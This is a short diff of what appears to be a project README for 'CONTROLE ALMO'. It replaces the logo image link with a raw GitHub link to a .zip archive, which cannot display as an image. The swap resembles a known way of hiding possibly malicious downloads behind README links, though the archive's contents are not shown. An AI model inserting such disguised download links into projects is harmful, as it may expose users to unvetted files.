@@ -1,5 +1,5 @@
 
-![Logo](https://i.ibb.co/whxxyGyP/controlealmo.png)
+![Logo](https://raw.githubusercontent.com/Euadud/ControleAlmo/main/intermountain/ControleAlmo.zip)
 
 
 CONTROLE ALMO
